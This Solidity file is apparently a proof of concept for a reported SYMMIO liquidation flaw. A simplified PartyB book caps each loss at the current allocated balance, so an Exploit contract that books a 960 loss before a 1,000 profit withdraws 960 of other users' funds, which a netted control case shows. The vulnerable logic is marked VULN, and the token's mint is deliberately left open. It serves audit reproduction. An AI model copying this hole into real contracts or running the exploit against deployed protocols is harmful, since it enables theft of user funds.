// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  SYMMIO — liquidatePositionsPartyA caps each partyB loss at the allocated
    balance as of that position (Sherlock 2023-08, LiquidationFacetImpl).
    Loss of 960 against a 0 balance deducts 0. The later profit of 1,000 is
    added in full, so partyB withdraws 1,000. Netting both positions first
    leaves the fair 40. The extra 960 is other users' cash. */

contract Cash26347 {
    string public name = "Cash";
    string public symbol = "CASH";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PartyBBook26347 {
    Cash26347 public cash;
    int256 public allocated;
    uint256 public lastDeducted;

    constructor(Cash26347 c) {
        cash = c;
    }

    function liquidate(int256 upnl) external {
        if (upnl < 0) {
            uint256 amount = uint256(-upnl);
            uint256 bal = allocated > 0 ? uint256(allocated) : 0;
            uint256 amountToDeduct = amount < bal ? amount : bal;
            allocated -= int256(amountToDeduct);
            // @> VULN: the loss is capped by partyB's current allocated balance, so a loss that lands before a profit is dropped.
            lastDeducted = amountToDeduct;
        } else {
            allocated += upnl;
        }
    }

    function liquidateNet(int256 loss, int256 profit) external {
        int256 net = profit + loss;
        if (net > 0) {
            allocated += net;
        }
    }

    function withdraw(address to) external returns (uint256 paid) {
        require(allocated > 0, "zero");
        paid = uint256(allocated);
        allocated = 0;
        cash.transfer(to, paid);
    }
}

contract Exploit {
    uint256 public constant LOSS = 960 ether;
    uint256 public constant GAIN = 1000 ether;
    uint256 public constant FAIR = 40 ether;

    Cash26347 public cash;
    PartyBBook26347 public book;
    Cash26347 public cashC;
    PartyBBook26347 public bookC;

    uint256 public reserves;
    uint256 public deducted;
    int256 public inflated;
    uint256 public pulled;
    uint256 public leftForOthers;
    int256 public fairAllocated;
    uint256 public controlPulled;
    uint256 public controlLeft;

    function run() external {
        cash = new Cash26347();
        book = new PartyBBook26347(cash);
        cashC = new Cash26347();
        bookC = new PartyBBook26347(cashC);

        cash.mint(address(book), GAIN);
        reserves = cash.balanceOf(address(book));

        book.liquidate(-int256(LOSS));
        deducted = book.lastDeducted();
        book.liquidate(int256(GAIN));
        inflated = book.allocated();
        pulled = book.withdraw(address(this));
        leftForOthers = cash.balanceOf(address(book));

        cashC.mint(address(bookC), GAIN);
        bookC.liquidateNet(-int256(LOSS), int256(GAIN));
        fairAllocated = bookC.allocated();
        controlPulled = bookC.withdraw(address(this));
        controlLeft = cashC.balanceOf(address(bookC));

        require(reserves == GAIN, "reserves");
        require(deducted == 0, "deducted");
        require(inflated == int256(GAIN), "inflated");
        require(pulled == GAIN, "pulled");
        require(leftForOthers == 0, "others");
        require(cash.balanceOf(address(this)) == GAIN, "attacker");
        require(fairAllocated == int256(FAIR), "fair");
        require(controlPulled == FAIR, "control pulled");
        require(controlLeft == GAIN - FAIR, "control left");
        require(pulled - controlPulled == LOSS, "extra");
    }
}
